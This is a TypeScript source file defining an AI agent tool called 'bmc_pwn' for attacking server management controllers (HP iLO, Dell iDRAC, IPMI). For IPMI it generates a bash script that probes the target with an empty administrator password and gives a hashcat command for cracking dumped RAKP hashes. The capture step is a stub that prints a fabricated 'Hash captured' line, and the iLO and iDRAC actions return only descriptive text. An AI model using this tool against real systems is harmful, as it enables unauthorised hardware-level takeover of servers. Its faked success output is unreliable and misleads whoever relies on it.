export * as BmcPwnTool from "./bmc-pwn"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"

export const name = "bmc_pwn"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "Action: 'ilo_exploit' (Target HP iLO interfaces), 'idrac_exploit' (Target Dell iDRAC), 'ipmi_dump' (Dump IPMI hashes).",
  }),
  target_ip: Schema.String.annotate({
    description: "IP address of the BMC/IPMI interface.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  script: Schema.String.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Baseboard Management Controller (BMC) Exploitation. Targets Out-of-Band (OOB) management interfaces like HP iLO, Dell iDRAC, and Supermicro IPMI. Compromising the BMC grants hardware-level control: power cycling the server, modifying the BIOS/UEFI, and viewing the screen regardless of the OS firewall.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const action = input.action.toLowerCase()
              let script = ""
              let outputText = ""

              if (action === "ipmi_dump") {
                outputText = `# IPMI Hash Dumping (Cipher Zero / HMAC-SHA1)\n\nTarget: ${input.target_ip}:623 (UDP)\nImpact: Extracting the BMC administrator password hash without authentication.`
                script = `#!/usr/bin/env bash
# IPMI 2.0 RAKP Hash Dump
# IPMI 2.0 allows the client to request the server's password hash (HMAC) for offline cracking before authenticating.

TARGET="${input.target_ip}"
ipmitool -I lanplus -H $TARGET -U Administrator -P '' chassis status 2>&1 | grep -i "Error" > /dev/null

# We use Metasploit or a custom python script to send the RAKP message 1
# The server responds with RAKP message 2 containing the HMAC.
echo "[*] Sending IPMI RAKP request..."
# ... logic to capture hash ...
echo "[+] Hash captured: \$IPMI\$..."
echo "[*] Crack with: hashcat -m 7300 hashes.txt wordlist.txt"
`
              } else if (action === "ilo_exploit") {
                outputText = `# HP iLO Exploitation\n\nTarget: ${input.target_ip}\nImpact: Bypassing authentication to gain root on the iLO OS (often a custom RTOS), granting full KVM access to the physical server.`
              } else {
                outputText = `Action ${action} logic framework generated.`
              }

              return { output: outputText, script: script }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "BMC Pwn failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/bmc-pwn",
  layer,
  deps: [ToolRegistry.node],
})
